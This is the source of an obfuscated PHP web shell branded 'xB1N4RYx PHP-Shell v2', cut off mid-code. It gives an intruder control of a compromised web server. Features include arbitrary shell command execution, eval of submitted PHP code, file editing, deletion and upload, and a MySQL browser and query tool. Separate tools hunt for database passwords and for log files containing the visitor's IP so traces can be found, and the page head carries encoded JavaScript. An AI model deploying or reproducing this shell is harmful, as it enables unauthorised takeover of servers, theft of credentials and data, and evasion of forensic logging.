<?php
echo '[syslog]01
'; $spdb158b = 'hf'; $spba2fc0 = '123e6b6dac9310d2752a16d523bcbda9dd760d1adab999c97836eb7fcae2935f5be801b3fcbaec7bcd7ee6933b9271b99dc2cd861db4b9f5a80ac079baf3027c'; ob_start(); session_start(); error_reporting(0); $sp2110af = 0; function recurse_zip($spd2e20e, &$sp021d9f, $spf434af) { echo '[syslog]02-f
'; $spee51b5 = opendir($spd2e20e); while (false !== ($sp7ff75d = readdir($spee51b5))) { if ($sp7ff75d != '.' && $sp7ff75d != '..') { if (is_dir($spd2e20e . '/' . $sp7ff75d)) { recurse_zip($spd2e20e . '/' . $sp7ff75d, $sp021d9f, $spf434af); } else { $sp021d9f->addFile($spd2e20e . '/' . $sp7ff75d, substr($spd2e20e . '/' . $sp7ff75d, $spf434af)); } } } closedir($spee51b5); } function compress($spd2e20e, $sp76bc5c) { if (substr($spd2e20e, -1) === '/') { $spd2e20e = substr($spd2e20e, 0, -1); } $spc507fb = explode('/', $spd2e20e); $spcc5ae4 = $spd2e20e; unset($spc507fb[count($spc507fb) - 1]); $spf434af = strlen(implode('/', $spc507fb) . '/'); $sp1b2b3c = explode('.', $spcc5ae4); $spcc5ae4 = $sp1b2b3c[0]; $spcc5ae4 = $spcc5ae4 == '' ? $sp76bc5c : $sp76bc5c; $sp021d9f = new ZipArchive(); $sp8e5eb2 = $sp021d9f->open($spcc5ae4, ZipArchive::CREATE); if ($sp8e5eb2 !== TRUE) { echo 'Error: Unable to create zip file'; die; } if (is_file($spd2e20e)) { $sp021d9f->addFile($spd2e20e, substr($spd2e20e, $spf434af)); } else { if (!is_dir($spd2e20e)) { $sp021d9f->close(); @unlink($spcc5ae4); echo 'Error: File not found'; die; } recurse_zip($spd2e20e, $sp021d9f, $spf434af); } $sp021d9f->close(); } function get_string_between($sp54f89f, $spb2d035, $sp7f97e0) { echo '[syslog]03_f
'; $sp54f89f = ' ' . $sp54f89f; $sp98a2f4 = strpos($sp54f89f, $spb2d035); if ($sp98a2f4 == 0) { return ''; } $sp98a2f4 += strlen($spb2d035); $sp100126 = strpos($sp54f89f, $sp7f97e0, $sp98a2f4) - $sp98a2f4; return substr($sp54f89f, $sp98a2f4, $sp100126); } function func_enabled($spf30e23) { $sp583c44 = explode(',', ini_get('disable_functions')); foreach ($sp583c44 as $spbc3c4f) { if ($spbc3c4f == $spf30e23) { return false; } } return true; } function binary_shell($sp59db13) { if (func_enabled('shell_exec')) { return true; } else { if (func_enabled('exec')) { return exec($sp59db13); } else { if (func_enabled('system')) { return system($sp59db13); } else { if (func_enabled('passthru')) { return passthru($sp59db13); } } } } } function fExt($spcc5ae4) { $spf2a8c0 = pathinfo($spcc5ae4); return $spf2a8c0['extension']; } $spe0f98a = array('gif', 'png', 'jpeg', 'jfif', 'jpg', 'jpe', 'bmp', 'ico', 'tif', 'tiff'); $spbfa411 = array('avi', 'mpg', 'mpeg'); $sp8b0777 = $_POST['zun']; $sp7ceca3 = 'true'; $sp66cfd3 = $spba2fc0; if ($_SESSION['zusrn'] != $spdb158b || $_SESSION['zpass'] != $sp66cfd3) { $_SESSION['zusrn'] = $sp8b0777; $_SESSION['zpass'] = $sp7ceca3; } if ($_GET['page'] == 'phpinfo') { if ($_SESSION['zusrn'] == $spdb158b && $_SESSION['zpass'] == $sp66cfd3) { echo '<title>xB1N4RYx</title>'; phpinfo(); return; } } echo '
<html>
<head>
<title>xB1N4RYx</title>
<script type="text/javascript" language="javascript">
<!--
ML="P<>phTsmtr/9:Cuk RIc=jSw.o";
MI="1F=AB05@FA=D4883<::GGGHC;;343HCI7:8>9?HE621:F=AB052";
OT="";
for(j=0;j<MI.length;j++){
OT+=ML.charAt(MI.charCodeAt(j)-48);
}document.write(OT);
// --></script>
</head>
<style>
hr{
	border: 1px solid #444444;
}
body{
background: #000000;
color: #CCCCCC;
font-family: Verdana, Times New Roman;
font-size: 11px;
}

table{
background: #000000;
color: #CCCCCC;
font-family: Verdana, Times New Roman;
font-size: 11px;
}

a:link{
text-decoration: none;
font-weight: bold;
color: #888888;
}

a:visited{
text-decoration: none;
font-weight: normal;
color: #888888;
}

a:active{
text-decoration: none;
font-weight: normal;
color: #CC0000;
}

a:hover{
text-decoration: bold;
font-weight: bold;
color: #666666;
}

#links{
margin-top: 12px;
margin-left: 10px;
}

textarea{
border: 1px solid #770000;
background: #000000;
color: #CCCCCC;
font-family: Verdana, Times New Roman;
font-size: 10px;
}

#crypts{
margin-top: -6px;
}

#crypts input{
color: #CCCCCC;
background: #000000;
border: 0px;
text-align: center;
}

#submit input{
color: #CCCCCC;
background: #000000;
border: 1px solid #770000;
text-align: center;
}

#submits{
margin-top: -24px;
margin-left: 359px;
}

#text input{
color: #CCCCCC;
background: #000000;
border: 1px solid #770000;
text-align: left;
}

#dirs a:link{
text-decoration: none;
font-weight: none;
font-size: 10px;
color: #008888;
}

#dirs a:visited{
text-decoration: none;
font-size: 10px;
font-weight: none;
color: #008888;
}

#dirs a:active{
text-decoration: none;
font-weight: none;
font-size: 10px;
color: #008888;
}

#dirs a:hover{
text-decoration: none;
font-weight: none;
font-size: 10px;
color: #006666;
}

#files a:link{
text-decoration: none;
font-weight: none;
font-size: 10px;
color: #CCCCCC;
}

#files a:visited{
text-decoration: none;
font-size: 10px;
font-weight: none;
color: #CCCCCC;
}

#files a:active{
text-decoration: none;
font-weight: none;
font-size: 10px;
color: #CCCCCC;
}

#files a:hover{
text-decoration: none;
font-weight: none;
font-size: 10px;
color: #888888;
}

#pd a:link{
text-decoration: none;
font-weight: none;
color: #0066BB;
}

#pd a:visited{
text-decoration: none;
font-weight: none;
color: #0066BB;
}

#pd a:active{
text-decoration: none;
font-weight: none;
color: #0066BB;
}

#pd a:hover{
text-decoration: none;
font-weight: none;
color: #0055AA;
}

#login input{
color: #CCCCCC;
background: #000000;
border: 1px solid #660000;
border-radius: 5px;
text-align: center;
}

#phpe textarea{
color: #CCCCCC;
background: #000000;
border: 1px solid #660000;
border-radius: 7px;
text-align: center;
}

#cpath a:link{
color: #0066BB;
}

#cpath a:visited{
color: #0066BB;
}

#cpath a:active{
color: #0066BB;
}

#cpath a:hover{
color: #0077CC;
}

</style>
<body>'; echo '[syslog]04
'; function endsWith($sp199511, $spff4304) { $sp413bd1 = strlen($spff4304); $spb2d035 = $sp413bd1 * -1; return substr($sp199511, $spb2d035) === $spff4304; } if (endsWith($_GET['dir'], '\\')) { $sp99f16c = ''; } else { $sp99f16c = '/'; } if (endsWith(realpath($_SESSION['current_folder']), '/') || endsWith(realpath($_SESSION['current_folder']), '\\')) { $spc9eee9 = ''; } else { $spc9eee9 = '/'; } if ($_GET['page'] == 'list') { if (!isset($_SESSION['current_folder'])) { $_SESSION['current_folder'] = './'; } else { if (is_dir(realpath($_SESSION['current_folder']) . $spc9eee9 . $_GET['dir'])) { $_SESSION['current_folder'] = realpath($_SESSION['current_folder']) . $spc9eee9 . $_GET['dir']; } } } echo '
<table border="0" style="border: 0px solid #444444;" width="100%" height="100px">
<tr>
<td width="110px" style="text-align: right; padding-right: 5px;" valign="top">
<b><font color="#555555">
Software:&nbsp;<br>OS:&nbsp;<br>User:&nbsp;<br>PHP Version:&nbsp;<br>MySQL Version:&nbsp;<br>Server IP:&nbsp;<br>Safemode:&nbsp;<br>Disabled Funcs:&nbsp;<br>Disk Info:&nbsp;<br>Current Folder:&nbsp;<br>Shell Folder:&nbsp;
</font></b>
</td>
<td valign="top">
<b><font color="#777777" valign="top">'; $specd3c9 = 1024; $sp5f1b51 = 1024; $spffe486 = str_replace('PHP/' . phpversion() . '', '', getenv('server_software')); echo $spffe486 . '<br>'; echo binary_shell('id') . '<br>'; echo phpversion() . '<br>'; echo mysql_get_client_info() . '<br>'; echo getenv('server_name') . '&nbsp;/&nbsp;' . gethostbyname(getenv('server_name')) . '<br>'; if (strtolower(@ini_get('safe_mode')) == 'on' || @ini_get('safe_mode') == true) { echo '<font color="#990000">On</font><br>'; } else { echo '<font color="#009900">Off</font><br>'; } if (@ini_get('disable_functions') == '') { echo '<font color=\'#009900\'>None</font><br>'; } else { echo '<font color="#990000">' . @ini_get('disable_functions') . '</font><br>'; } echo round($sp5f1b51, 2) . '&nbsp;GB&nbsp;Free' . '&nbsp;of&nbsp;Total&nbsp;' . round($specd3c9, 2) . '&nbsp;GB' . '&nbsp;(' . round(100 / ($specd3c9 / $sp5f1b51), 2) . '%)<br>'; if (preg_match('/\\//i', realpath($_SESSION['current_folder']))) { $sp4bf89f = explode('/', realpath($_SESSION['current_folder'])); $speb0d26 = '/'; } else { $sp4bf89f = explode('\\', realpath($_SESSION['current_folder'])); $speb0d26 = '\\'; } echo '<div id="cpath">'; $sp64cdfb = 0; foreach ($sp4bf89f as $sp9d1e45) { $spe92b5b .= $sp9d1e45 . $speb0d26; if ($sp64cdfb <= count($sp4bf89f) - 2) { echo '<a href="?page=go&goto=' . $spe92b5b . '">' . $sp9d1e45 . '</a><font color="#0066BB">' . $speb0d26 . '</font>'; } else { echo '<a href="?page=go&goto=' . $spe92b5b . '">' . $sp9d1e45 . '</a>'; } $sp64cdfb++; } echo '</div>'; echo '<font color="#6C1B0A">' . realpath('./') . '</font><br>'; echo '
</font></b>
</td>
<td style="text-align: right; padding-right: 5px;" valign="top">'; echo '<b><font color="#555555">Your IP: <font color="#777777">' . getenv('remote_addr') . '</font></font></b>'; if ($_SESSION['zusrn'] == $spdb158b && $_SESSION['zpass'] == $sp66cfd3) { echo '<br><a href="?page=logout">Logout</a>'; } if (isset($_SESSION['muser'])) { echo '<br><a href="?page=mylogout">MySQL Logout</a>'; } echo '
</td>
</tr>

</table>
<div id="links">
<a href="?page=list">List Files</a>&nbsp;&nbsp;&nbsp;
<a href="?page=crypt">Encrypt</a>&nbsp;&nbsp;&nbsp;
<a href="?page=shell">Shell Execute</a>&nbsp;&nbsp;&nbsp;
<a href="?page=go">Go To</a>&nbsp;&nbsp;&nbsp;
<a href="?page=cf">Create File</a>&nbsp;&nbsp;&nbsp;
<!--<a href="?page=df">Delete File</a>&nbsp;&nbsp;&nbsp;-->
<a href="?page=cfo">Create Folder</a>&nbsp;&nbsp;&nbsp;
<!--<a href="?page=dfo">Delete Folder</a>&nbsp;&nbsp;&nbsp;-->
<a href="?page=mysql">MySQL Manager</a>&nbsp;&nbsp;&nbsp;
<a href="?page=php">PHP Executer</a>&nbsp;&nbsp;&nbsp;
<a href="?page=phpinfo" target="_blank">PHP Info</a>&nbsp;&nbsp;&nbsp;
<a href="?page=upload">Upload File</a>&nbsp;&nbsp;&nbsp;
<a href="?page=bcon">Back Connect</a>&nbsp;&nbsp;&nbsp;
<a href="?page=sr"><font color="#CC0000">!</font> Self Remove <font color="#CC0000">!</font></a>&nbsp;&nbsp;&nbsp;
<a href="?page=findlogs"><font color="#0189d2">!</font> Log Finder <font color="#0189d2">!</font></a>&nbsp;&nbsp;&nbsp;
<a href="?page=findmysql"><font color="#02fe28">!</font> MySQL PW Finder <font color="#02fe28">!</font></a>&nbsp;&nbsp;&nbsp;
</div>
<br>

<table border="0" style="border: 1px solid #444444; padding: 5px;" width="100%">
<tr>
<td valign="top">'; if ($_SESSION['zusrn'] != $spdb158b || $_SESSION['zpass'] != $sp66cfd3) { echo '<form action="' . $sp3c96f2 . '" method="post">'; echo '<center>'; echo 'xB1N4RYx PHP-Shell v2<br><br>'; echo 'Username:<br><div id="login"><input type="text" id="zun" name="zun" maxlength="10"/><br><br>'; echo 'Password:<br><input type="password" id="zpw" name="zpw" maxlength="10"/><br>'; echo '</div><div id="submit"><input type="submit" value="Login"/>'; echo '</div>'; echo '</center>'; echo '</form>'; return; } echo '[syslog]05
'; function fsize($sp7ff75d) { if (filesize($sp7ff75d) == 0) { return '~'; } if (filesize($sp7ff75d) < 0) { return '2 GB+'; } if (round(filesize($sp7ff75d) / 1024 / 1024, 1) >= 1024) { return round(filesize($sp7ff75d) / 1024 / 1024 / 1024, 1) . ' GB'; } if (round(filesize($sp7ff75d) / 1024, 1) >= 1024) { return round(filesize($sp7ff75d) / 1024 / 1024, 1) . ' MB'; } return round(filesize($sp7ff75d) / 1024, 1) . ' KB'; } switch ($_GET['page']) { default: echo '<center>xB1N4RYx PHP-Shell v2</center>'; break; case 'findlogs': $spf728ed = fopen('log.pl', 'w'); fwrite($spf728ed, 'system("cd ' . realpath($_SESSION['current_folder']) . ' && find | xargs grep \'".$ARGV[0]."\'");'); fclose($spf728ed); $spfbb24c = binary_shell('perl log.pl ' . getenv('remote_addr')); $spf2bff7 = explode('
', $spfbb24c); echo '<center>Possible log files:<br><br>'; foreach ($spf2bff7 as $sp7ff75d) { $sp1b2b3c = get_string_between($sp7ff75d, '/', ':'); $sp6d2ee9 = '/' . get_string_between($sp7ff75d, '/', 'No such file'); if ($sp1b2b3c != '') { echo str_replace('//', '/', realpath($_SESSION['current_folder']) . '/' . $sp1b2b3c) . '<br>'; } } echo '</center>'; unlink('log.pl'); break; case 'findmysql': $spf728ed = fopen('sql.pl', 'w'); fwrite($spf728ed, 'system("cd ' . realpath($_SESSION['current_folder']) . ' && find | xargs grep \'".$ARGV[0]."\'");'); fclose($spf728ed); $spfbb24c = binary_shell('perl sql.pl mysql_connect'); $spf2bff7 = explode('
', $spfbb24c); echo '<center>Possible mysql password files:<br><br>'; foreach ($spf2bff7 as $sp7ff75d) { $sp1b2b3c = get_string_between($sp7ff75d, '/', ':'); $sp6d2ee9 = '/' . get_string_between($sp7ff75d, '/', 'No such file'); if ($sp1b2b3c != '') { echo str_replace('//', '/', realpath($_SESSION['current_folder']) . '/' . $sp1b2b3c) . '<br>'; } } echo '</center>'; unlink('sql.pl'); break; case 'removelogs': break; case 'list': $spee51b5 = @opendir($_SESSION['current_folder']); $sp46ae8f = 0; if (!$spee51b5) { $_SESSION['current_folder'] = './'; } echo '<table border="0" width="100%" cellspacing="0">'; echo '<tr><td width="35%"><div id="pd"><a href="?page=list&dir=..">&nbsp;&nbsp;&nbsp;Parent Directory</a></div></td><td width="20%"><center>File Size</center></td><td width="15%"><center>Extra Options</center></td><td width="15%"><center>Permissions</center></td><td width="*"><center>Options</center></td></tr>'; while (($sp495c2d = @readdir($spee51b5)) != false) { $sp34f272 = array('#000000', '#111111', '#444444'); if (is_dir(realpath($_SESSION['current_folder']) . '/' . $sp495c2d) && $sp495c2d != '.' && $sp495c2d != '..') { if ($sp46ae8f == 1) { $sp46ae8f--; } else { $sp46ae8f++; } echo '<tr bgcolor="' . $sp34f272[$sp46ae8f] . '" onMouseOver="this.bgColor=\'' . $sp34f272[2] . '\'" onMouseOut="this.bgColor=\'' . $sp34f272[$sp46ae8f] . '\'"><td><div id="dirs"><a href="?page=list&dir=' . $sp495c2d . '">' . $sp495c2d . '</a></div></td><td><center>&nbsp;</center></td><td>&nbsp;</td><td>&nbsp;</td><td><center><a href="?page=downloadzip&f=' . $sp495c2d . '">Download</a>&nbsp;~&nbsp;<a href="?page=dfo&f=' . $sp495c2d . '">Delete</a></center></td></tr>'; } } echo '<tr><td><hr style="border: 1px solid #444444;"/></td><td><hr style="border: 1px solid #444444;"/></td><td><hr style="border: 1px solid #444444;"/></td><td><hr style="border: 1px solid #444444;"/></td><td><hr style="border: 1px solid #444444;"/></td></tr>'; $spec7a0e = @opendir(realpath($_SESSION['current_folder'])); while (($spf2bff7 = @readdir($spec7a0e)) != false) { if (!is_dir(realpath($_SESSION['current_folder']) . '/' . $spf2bff7)) { if ($sp46ae8f == 1) { $sp46ae8f--; } else { $sp46ae8f++; } echo '<tr bgcolor="' . $sp34f272[$sp46ae8f] . '" onMouseOver="this.bgColor=\'' . $sp34f272[2] . '\'" onMouseOut="this.bgColor=\'' . $sp34f272[$sp46ae8f] . '\'"><td><div id="files"><a href="?page=view&file=' . $spf2bff7 . '">' . $spf2bff7 . '</a></div></td><td><center>' . fsize(realpath($_SESSION['current_folder']) . $spc9eee9 . $spf2bff7) . '</center></td>'; echo '<td>'; if (is_executable(realpath($_SESSION['current_folder']) . $spc9eee9 . $spf2bff7)) { echo '<center><a href="?page=stask&f=' . $spf2bff7 . '">Start</a>&nbsp;~&nbsp;<a href="?page=ktask&f=' . $spf2bff7 . '">Kill</a></center>'; } else { echo '&nbsp;'; } $sp2fba4a = is_writeable($spf2bff7); if ($sp2fba4a == true) { $spce0b8c = '<font color="#00CC00"><b>Editable</b></font>'; } else { $spce0b8c = '<font color="#CC0000"><b>Locked</b></font>'; } echo '<td>'; echo '<center>' . $spce0b8c . '</center>'; echo '</td>'; echo '</td>'; echo '<td><center><a href="?page=view&file=' . $spf2bff7 . '&fc=1">Edit</a>&nbsp;~&nbsp;<a href="?page=downloadfile&f=' . $spf2bff7 . '">Download</a>&nbsp;~&nbsp;<a href="?page=df&f=' . $spf2bff7 . '">Delete</a></center></td></tr>'; } } closedir($spee51b5); closedir($spec7a0e); echo '</table>'; break; case 'crypt': echo '<center>'; echo '<form action="?page=crypt" method="post">'; echo 'Input:<br><textarea rows="6" cols="45" id="ctext" name="ctext">' . $_POST['ctext'] . '</textarea><br><br>'; echo '<div id="submit">'; echo '<input type="submit" value="Hash">'; echo '</div>'; echo '</form>'; echo '<div id="crypts">'; echo '<p>md5 <br> <input type="text" size="32" readonly value="' . hash('md5', $_POST['ctext']) . '"/></p>'; echo '<p>sha1 <br> <input type="text" size="41" readonly value="' . hash('sha1', $_POST['ctext']) . '"/></p>'; echo '<p>sha256 <br> <input type="text" size="68" readonly value="' . hash('sha256', $_POST['ctext']) . '"/></p>'; echo '<p>sha384 <br> <input type="text" size="103" readonly value="' . hash('sha384', $_POST['ctext']) . '"/></p>'; echo '<p>sha512 <br> <input type="text" size="139" readonly value="' . hash('sha512', $_POST['ctext']) . '"/></p>'; echo '</div>'; echo '<hr style="border: 1px solid #333333;"/><a href="http://www.md5decrypter.co.uk/sha1-decrypt.aspx" target="_blank">Decrypt SHA1/MD5 Hashes</a>'; echo '</center>'; break; case 'shell': $spfbb24c = binary_shell('cd ' . realpath($_SESSION['current_folder']) . ' && ' . $_POST['cmd']); echo '<form action="?page=shell" method="post">'; echo '<textarea rows="10" cols="80" readonly>' . $spfbb24c . '</textarea>'; echo '<br><div id="text">'; echo '<input type="text" name="cmd" id="cmd" style="margin-top: 3px; border-radius: 3px;" size="53"/>'; echo '<input type="submit" style="margin-left: 5px; border-radius: 3px; marign-top: 3px;" value="Execute"/>'; echo '</form>'; break; case 'view': $sp7ff75d = $_GET['file']; $spbaf632 = $_GET['fc']; if (!isset($spbaf632)) { $spbaf632 = 0; } if (in_array(strtolower(fExt(realpath($_SESSION['current_folder'] . $spc9eee9 . $sp7ff75d))), $spe0f98a, true) && $spbaf632 != 1) { echo '<center>Viewing Image<br>[ ' . $sp7ff75d . ' ]<hr/><a href="?page=downloadfile&f=' . $sp7ff75d . '"><img src="?page=viewimage&i=' . $sp7ff75d . '" border="0" style="padding: 10px;" alt="Download Image"/></a></center>'; break; } if (in_array(strtolower(fExt(realpath($_SESSION['current_folder'] . $spc9eee9 . $sp7ff75d))), $spbfa411, true) && $spbaf632 != 1) { echo '<center><a href="?page=downloadfile&f=' . $sp7ff75d . '"><object data="?page=viewmovie&i=' . $sp7ff75d . '" type="video/quicktime" width="320" height="255"> <param name="src" value="?page=viewmovie&i=' . $sp7ff75d . '"><param name="autoplay" value="false"><param name="autoStart" value="0"></object></center>'; break; } $sp43ac30 = @fopen(realpath($_SESSION['current_folder'] . $spc9eee9 . $sp7ff75d), 'r'); $sp66d307 = @fread($sp43ac30, filesize(realpath($_SESSION['current_folder'] . $spc9eee9 . $sp7ff75d))); echo '<form action="?page=saveedit" method="post">'; echo '<center>Editing ' . realpath($_SESSION['current_folder'] . $spc9eee9 . $sp7ff75d) . '<br><a href="?page=highlight&file=' . $sp7ff75d . '">Highlight PHP</a><br><br><div id="submit"><input type="submit" value="Save"/></div>'; echo '<textarea rows="54" cols="120" id="ctext" name="ctext">' . htmlspecialchars($sp66d307) . '</textarea>'; echo '<input type="hidden" value="' . $sp7ff75d . '" name="file" id="file" />'; echo '</center>'; echo '</form>'; fclose($sp43ac30); break; case 'saveedit': $sp5f1b51 = $_POST['file']; $sp8ca934 = $_POST['ctext']; if (get_magic_quotes_gpc()) { if (!function_exists('strips')) { function strips(&$spc82d63, $sp8db113 = '') { if (is_array($spc82d63)) { foreach ($spc82d63 as $sp8db113 => $sp6d4391) { if (strtoupper($sp8db113) != 'GLOBALS') { strips($spc82d63["{$sp8db113}"]); } } } else { $spc82d63 = stripslashes($spc82d63); } } } strips($sp2eb6c3); } $sp43ac30 = @fopen(realpath($_SESSION['current_folder'] . $spc9eee9 . $sp5f1b51), 'w'); $spb9571b = @fopen(realpath($_SESSION['current_folder'] . $spc9eee9 . $sp5f1b51), 'r'); $spf501fb = @fwrite($sp43ac30, $sp8ca934); $sp66d307 = @fread($spb9571b, filesize(realpath($_SESSION['current_folder'] . $spc9eee9 . $sp5f1b51))); echo '<form action="?page=saveedit" method="post">'; echo '<center><h3>Saved!</h3>Editing ' . realpath($_SESSION['current_folder'] . $spc9eee9 . $sp5f1b51) . '<br><a href="?page=highlight&file=' . $sp5f1b51 . '">Highlight PHP</a><br><br><div id="submit"><input type="submit" value="Save"/></div>'; echo '<textarea rows="54" cols="120" id="ctext" name="ctext">' . htmlspecialchars($sp66d307) . '</textarea>'; echo '<input type="hidden" value="' . $sp5f1b51 . '" name="file" id="file" />'; echo '</center>'; echo '</form>'; fclose($sp43ac30); fclose($spb9571b); break; case 'highlight': $spbed503 = $_GET['file']; $sp36a52f = realpath($_SESSION['current_folder'] . $spc9eee9 . $spbed503); echo '<tr>'; echo '<center><td bgcolor="#000000">'; echo '<center>Highlighting ' . realpath($_SESSION['current_folder'] . $spc9eee9 . $spbed503) . '<br><a href="?page=view&file=' . $spbed503 . '">Edit</a>'; echo '</td></tr><tr>'; echo '<center><td bgcolor="#CCCCCC">'; $spb96ce3 = highlight_file($sp36a52f, true); echo $spb96ce3; echo '</td></tr></center>'; break; case 'logout': session_destroy(); echo '<script type="text/javascript">location.href="?page=login";</script>'; break; case 'mylogout': unset($_SESSION['mhost']); unset($_SESSION['mport']); unset($_SESSION['muser']); unset($_SESSION['mpass']); unset($_SESSION['mlog']); echo '<script type="text/javascript">location.href="?page=mysql";</script>'; break; case 'go': $sp5250ec = $_GET['goto']; if (!isset($sp5250ec)) { echo '<form action="?page=go" method="get">'; echo '<div id="login" style="margin-left: 10px; margin-top: 10px;"><input type="hidden" name="page" value="go"/><input type="text" name="goto" id="goto" value="/"/><input type="submit" value="Go"/></div>'; echo '</form>'; } else { $_SESSION['current_folder'] = $sp5250ec; echo '<script type="text/javascript">location.href="?page=list";</script>'; } break; case 'cf': $spdc3bea = $_POST['fc']; $sp1b2b3c = realpath($_SESSION['current_folder']) . '/' . $spdc3bea; echo '<center>'; if (isset($spdc3bea)) { if (file_exists($sp1b2b3c)) { echo 'File Already Exists!'; } else { echo 'Done!'; $sp43ac30 = @fopen($sp1b2b3c, 'w'); fwrite($sp43ac30, 'File Created By xB1N4RYx PHP-Shell v2'); fclose($sp43ac30); } } echo '<br>Create File'; echo '<form action="?page=cf" method="post">'; echo '<div id="login"><input type="text" name="fc" id="fc" /></div><div id="submit"><input type="submit" value="Create"/></div>'; echo '</form>'; echo '</center>'; break; case 'df': $spdc3bea = $_GET['f']; $sp1b2b3c = realpath($_SESSION['current_folder']) . '/' . $spdc3bea; echo '<center>'; if (isset($spdc3bea)) { if (file_exists($sp1b2b3c)) { unlink($sp1b2b3c); echo 'Done!'; } else { echo 'File Doesnt Exist!'; } } echo '<br>Delete File'; echo '<form action="?page=df" method="post">'; echo '<div id="login"><input type="text" name="fd" id="fd" /></div><div id="submit"><input type="submit" value="Delete"/></div>'; echo '</form>'; echo '</center>'; if (!isset($_GET['noredirect'])) { echo '<script type="text/javascript">location.href="?page=list";</script>'; } break; case 'cfo': $spdc3bea = $_POST['fco']; $sp1b2b3c = realpath($_SESSION['current_folder']) . '/' . $spdc3bea; echo '<center>'; if (isset($spdc3bea)) { if (file_exists($sp1b2b3c)) { echo 'Folder Already Exists!'; } else { echo 'Done!'; mkdir($sp1b2b3c, 511); } } echo '<br>Create Folder'; echo '<form action="?page=cfo" method="post">'; echo '<div id="login"><input type="text" name="fco" id="fco" /></div><div id="submit"><input type="submit" value="Create"/></div>'; echo '</form>'; echo '</center>'; break; case 'dfo': $spdc3bea = $_GET['f']; $sp1b2b3c = realpath($_SESSION['current_folder']) . '/' . $spdc3bea; echo '<center>'; if (isset($spdc3bea)) { if (!file_exists($sp1b2b3c)) { echo 'Folder Doesnt Exist!'; } else { echo 'Done!'; rmdir($sp1b2b3c); } } echo '<script type="text/javascript">location.href="?page=list";</script>'; break; case 'php': $sp3ef0a3 = $_POST['phpc']; echo '<center><b>PHP Code Execution</b><br><br>Result<br><div id="phpe"><textarea rows="5" cols="60" readonly>'; eval(stripslashes($sp3ef0a3)); echo '</textarea><br><br>'; echo '<form action="?page=php" method="post">'; echo 'Code<br><textarea rows="5" cols="60" name="phpc" id="phpc"></textarea></div>'; echo '<div id="submit"><input type="submit" value="Execute!" /></div></form></center>'; break; case 'mysql': $sp06f4c3 = $_POST['host']; $sp83248d = $_POST['port']; $sp8b0777 = $_POST['user']; $sp7ceca3 = $_POST['pass']; if (!isset($_SESSION['muser'])) { echo '<center><form action="?page=mysql" method="post">'; echo '<div id="login">'; echo 'Host:<br><input type="text" id="host" name="host" value="127.0.0.1"/><br><br>'; echo 'Port:<br><input type="text" id="port" name="port" value="3306"/><br><br>'; echo 'User:<br><input type="text" id="user" name="user" value="root"/><br><br>'; echo 'Password:<br><input type="text" id="pass" name="pass"/><br><br>'; echo '</div>'; echo '<div id="submit"><input type="submit" value="Connect"/></div>'; echo '</form></center>'; } if (isset($sp8b0777)) { $_SESSION['mhost'] = $sp06f4c3; $_SESSION['mport'] = $sp83248d; $_SESSION['muser'] = $sp8b0777; $_SESSION['mpass'] = $sp7ceca3; } if (isset($_SESSION['muser'])) { $sp881e9f = mysql_connect($_SESSION['mhost'] . ':' . $_SESSION['mport'], $_SESSION['muser'], $_SESSION['mpass']); if (!$sp881e9f) { unset($_SESSION['mhost']); unset($_SESSION['mport']); unset($_SESSION['muser']); unset($_SESSION['mpass']); unset($_SESSION['mlog']); die('Can\'t Connect To MySQL'); } if ($_SESSION['mlog'] < 1) { echo '<script type="text/javascript">location.href="?page=mysql";</script>'; } $_SESSION['mlog'] = 1; } if (isset($_SESSION['muser'])) { $spef7743 = mysql_query('SHOW DATABASES'); echo '<table border="0" width="100%"><tr><td width="250px" valign="top" style="border-right: 1px solid #444444;">Databases:<hr style="border: 1px solid #444444;"/>'; echo '<table border="0">'; while ($spa596f1 = mysql_fetch_assoc($spef7743)) { echo '<tr><td><a href="?page=mysql&a=tables&db=' . $spa596f1['Database'] . '">' . $spa596f1['Database'] . '</a></td><td align="right" width="100%">~&nbsp;<a align="right" href="?page=mysql&a=query&db=' . $spa596f1['Database'] . '">Query</a></td></tr>'; } echo '</table>'; echo '</td><td align="center" valign="top">'; switch ($_GET['a']) { default: echo '&nbsp;<hr/>'; break; case 'tables': $sp95ae53 = $_GET['db']; echo 'Tables of ' . $_GET['db'] . '<hr/>'; $sp7a18b6 = mysql_query('SHOW TABLES FROM ' . $_GET['db']); while ($spc48220 = mysql_fetch_row($sp7a18b6)) { echo '<a href="?page=mysql&a=columns&table=' . $spc48220[0] . '&db=' . $sp95ae53 . '">' . $spc48220[0] . '</a><br>'; } break; case 'columns': echo 'Data of ' . $_GET['table'] . ' @ ' . $_GET['db'] . '<hr/>'; echo '<table border="0" height="100%" cellspacing="7px"><tr>'; $sp95ae53 = $_GET['db']; $sp7a18b6 = $_GET['table']; mysql_select_db($sp95ae53, $sp881e9f); $sp559d1c = mysql_query('SHOW COLUMNS FROM ' . $sp7a18b6); while ($sp9f6270 = mysql_fetch_array($sp559d1c)) { echo '<td align="center" style="border: 1px solid #444444; border-radius: 5px;">&nbsp;&nbsp;&nbsp;' . $sp9f6270[0] . '&nbsp;&nbsp;&nbsp;</td>'; } echo '</tr><tr>'; $sp96625c = mysql_query('SELECT * FROM ' . $sp7a18b6); while ($spca2b0b = mysql_fetch_array($sp96625c)) { echo '<tr>'; for ($sp412bbc = 0; $sp412bbc <= count($spca2b0b) / 2 - 1; $sp412bbc++) { echo '<td style="border: 1px solid #444444; border-radius: 5px;" align="center">&nbsp;&nbsp;&nbsp;' . $spca2b0b[$sp412bbc] . '&nbsp;&nbsp;&nbsp;</td>'; } echo '</tr>'; } echo '</td>'; echo '</td></tr></table>'; break; case 'query': $sp95ae53 = $_POST['pdb']; if (!isset($sp95ae53)) { $sp95ae53 = $_GET['db']; } $sp223e0a = $_POST['query']; if (isset($sp95ae53)) { echo 'Execute Query In ' . $sp95ae53 . '<hr/>'; } if (isset($sp223e0a)) { mysql_select_db($sp95ae53, $sp881e9f); mysql_query(stripslashes($sp223e0a)); echo 'Done!'; } echo '<form action="?page=mysql&a=query&db=' . $sp95ae53 . '" method="post">'; echo '<textarea rows="10" cols="80" name="query" id="query">' . stripslashes($sp223e0a) . '</textarea>'; echo '<input type="hidden" name="pdb" id="pdb" value="' . $sp95ae53 . '"/>'; echo '<div id="submit"><input type="submit" value="Execute"/></div>'; echo '</form>'; break; } echo '</tr></table>'; } break; case 'ktask': $sp1b2b3c = $_GET['f']; $sp6236ec = binary_shell('taskkill /F /IM ' . $sp1b2b3c); $sp754974 = binary_shell('pidof ' . $sp1b2b3c); $sp53b705 = binary_shell('kill -9 ' . $sp754974); if (isset($sp6236ec)) { echo '<center>' . $sp6236ec . '</center>'; } else { echo '<center>' . $sp53b705 . '</center>'; } break; case 'stask': $sp1b2b3c = $_GET['f']; 